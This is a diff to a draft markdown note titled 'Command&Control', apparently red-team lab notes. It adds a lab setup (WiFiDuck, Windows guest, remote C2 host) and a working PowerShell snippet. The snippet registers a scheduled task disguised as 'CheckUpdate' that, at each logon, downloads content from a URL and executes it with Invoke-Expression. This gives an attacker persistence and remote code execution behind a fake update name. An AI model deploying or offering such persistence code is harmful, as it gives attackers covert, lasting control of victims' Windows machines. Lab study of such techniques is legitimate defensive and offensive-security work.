@@ -1,5 +1,17 @@
 # Command&Control [draft]
 
+## Setup Lab
+- WiFiDuck
+- Windows guest
+- Remote Host (C2)
+
+Windows Task
+$a = New-ScheduledTaskAction -Execute 'powershell' -Argument '$rawcmd = Invoke-webrequest -URI https://URL -UseBasicParsing; Invoke-Expression $rawcmd;';
+
+$t = New-ScheduledTaskTrigger -AtLogon;
+
+Register-ScheduledTask -Action $a -Trigger $t -TaskPath "CheckUpdate" -TaskName "CheckUpdate" -Description "Check update."
+
 ## Villain C2
 
 ``` perl
